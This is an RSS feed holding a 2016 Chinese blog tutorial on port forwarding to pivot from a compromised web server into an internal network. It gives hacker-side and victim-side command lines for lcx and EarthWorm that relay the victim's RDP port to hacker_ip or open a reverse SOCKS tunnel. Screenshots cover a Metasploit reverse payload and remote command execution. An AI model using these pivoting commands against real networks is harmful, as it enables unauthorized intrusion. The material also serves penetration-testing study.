<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>端口转发 on </title>
    <link>http://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
    <description>Recent content in 端口转发 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Mon, 08 Aug 2016 19:33:45 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>端口转发</title>
      <link>http://wyb0.com/posts/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</guid>
      <description>

&lt;h3 id=&#34;0x00-应用场景:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x00 应用场景&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;内网IP的80端口通过端口映射到了外网IP的80端口上&lt;/li&gt;
&lt;li&gt;内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-判断web是否为内网:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x01 判断Web是否为内网&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;向ping域名，查看IP是外网&lt;/li&gt;
&lt;li&gt;用webshell查看ip却是内网IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-端口转发工具:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x02 端口转发工具&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;lcx&lt;/li&gt;
&lt;li&gt;htran&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://rootkiter.com/EarthWorm/&#34;&gt;EarthWorm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;netsh&lt;/li&gt;
&lt;li&gt;reGeorg&lt;/li&gt;
&lt;li&gt;meterpreter porfwd&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-lcx端口转发:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x03 lcx端口转发&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Hacker：lcx.exe -listen 500 8888&lt;/li&gt;
&lt;li&gt;Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389&lt;/li&gt;
&lt;li&gt;Hacker：cmd mstsc hacker_ip:500
&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_run_lcx.png&#34; alt=&#34;hacker运行lcx.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_vimctim_run_lcx.png&#34; alt=&#34;vimctim端运行lcx.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn.png&#34; alt=&#34;hacker远程连接.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn_success.png&#34; alt=&#34;hacker远程连接成功.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x04-earchworm端口转发:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x04 EarchWorm端口转发&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Hacker：./ew -s rcsocks -l 1080 -e 8888&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Victim：./ew -s rssocks -d hacker_ip -e 8888
&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_earchworm.png&#34; alt=&#34;earchworm原理.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;1-启动earchworm:34d8041f3cf738b31ff505fafa779a00&#34;&gt;1. 启动EarchWorm&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_linux_run_ew.png&#34; alt=&#34;hacker服务器启动ew.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_victim_run_ew.png&#34; alt=&#34;victim启动ew.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_linux_get_victim_conn.png&#34; alt=&#34;victim连接hacker服务器.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;2-hacker主机使用代理:34d8041f3cf738b31ff505fafa779a00&#34;&gt;2. hacker主机使用代理&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_set_proxy1.png&#34; alt=&#34;hacker内网主机设置代理1.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_set_proxy2.png&#34; alt=&#34;hacker内网主机设置代理2.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;3-hacker内网主机连接目标的内网主机:34d8041f3cf738b31ff505fafa779a00&#34;&gt;3. hacker内网主机连接目标的内网主机&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_ew_hacker_remote_conn.png&#34; alt=&#34;hacker连接内网主机.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png&#34; alt=&#34;hacker连接内网主机成功.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x05-meterpreter:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x05 Meterpreter&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Hacker端生成payload

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_msf_creat_payload.png&#34; alt=&#34;msf生成win反弹型的payload.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;msf监听端口

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_set_metasploit_listen_port.png&#34; alt=&#34;设置metasploit监听端口.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;目标主机运行exp

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_victim_run_exp.png&#34; alt=&#34;目标主机运行exp.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;msf收到新会话

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_msf_get_conn.png&#34; alt=&#34;msf收到目标主机的连接.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;msf执行命令

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_msf_exec_command.png&#34; alt=&#34;msf远程执行命令.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>